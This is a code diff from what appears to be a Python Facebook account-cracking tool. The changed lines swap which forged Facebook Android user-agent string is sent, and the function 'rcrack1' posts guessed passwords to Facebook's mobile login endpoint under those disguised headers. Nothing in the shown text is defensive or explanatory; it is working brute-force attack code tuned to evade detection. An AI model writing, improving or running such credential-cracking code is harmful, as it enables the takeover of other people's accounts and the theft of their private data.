@@ -59,8 +59,6 @@ ua = '[FBAN/FB4A;FBAV/23.0.0.4893;FBBV/2942833;[FBAN/FB4A;FBAV/25.0.0.1847;FBDM/
 ua = '[FBAN/FB4A;FBAV/27.0.0.3668;FBBV/6479370;[FBAN/FB4A;FBAV/20.0.0.3494;FBDM/density=1.0,width=1280,height=1280;FBLC/en_MM;FB_FW/1;FBCR/Myanmar_Atom;FBPN/com.facebook.katana,FBSV/3.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
 ua = '[FBAN/FB4A;FBAV/10.0.0.1367;FBBV/6351353;[FBAN/FB4A;FBAV/25.0.0.2612;FBDM/density=1.1,width=1080,height=1440;FBLC/en_MM;FB_FW/1;FBCR/Oreedoo;FBPN/com.facebook.katana,FBSV/2.1.2.;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
 ua = '[FBAN/FB4A;FBAV/36.0.0.4759;FBBV/4568754;[FBAN/FB4A;FBAV/11.0.0.1928;FBDM/density=2.0,width=1280,height=720;FBLC/en_MM;FB_FW/1;FBCR/Mectel;FBPN/com.facebook.katana,FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-sohanagent = random.choice(sn1)
-
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -273,7 +271,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':sohanagent,
+            'user-agent':pro,
             'viewport-width': '980',
 }
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
